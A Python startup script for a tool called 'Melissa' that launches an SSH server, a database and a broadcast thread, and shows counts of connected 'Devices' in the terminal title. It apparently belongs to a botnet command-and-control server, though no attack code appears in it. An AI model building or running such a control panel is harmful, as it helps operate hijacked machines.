import threading
import sys
import channel
import database
import paramiko
import os
import broadcast
import time

server_addr = "127.0.0.1"

if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} [port]")
    exit()
try:
    HOST_KEY = paramiko.RSAKey(filename="private.key")
except:
    print("Could not find RSA key!")
    exit()

def live_title():
    while 1:
        try:
            sys.stdout.write(f"\x1b]2;Melissa | Devices: {len(broadcast.addr_clients)} | Dup Devices {len(broadcast.dup_clients)} | PID: {str(os.getpid())}\x07")
            sys.stdout.flush()
            time.sleep(0.5)
        except:
            pass

def main():
    try:
        port = int(sys.argv[1])
    except:
        print("Port must be an integer")
        exit()
    
    print(f"[main] Initialized - PID {str(os.getpid())}")
    threading.Thread(target=live_title).start()
    threading.Thread(target=database.db_init).start()
    threading.Thread(target=channel.start_ssh,args=(server_addr, port), daemon=True).start()
    threading.Thread(target=broadcast.brd_init, daemon=True).start()

if __name__ == "__main__":
    main()